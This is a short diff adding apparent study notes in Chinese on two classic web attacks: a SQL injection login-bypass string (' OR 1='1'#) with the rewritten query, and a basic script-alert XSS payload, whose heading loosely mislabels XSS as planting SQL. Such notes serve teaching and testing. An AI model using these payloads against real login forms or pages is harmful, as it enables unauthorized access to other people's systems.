@@ -1,0 +1,15 @@
+1、SQL注入攻击 万能密码
+
+select * from user where username='admin' and password='123456'
+
+输入用户名：' OR 1='1'#
+密码任意
+SQL变成下面这个样子：
+
+select name,pass from tbAdmin where name='' OR 1='1'#' and password='123456'
+
+
+2、XSS注入攻击 植入任意SQL
+
+<script>alert("简单XSS注入攻击！");</script>
+ 
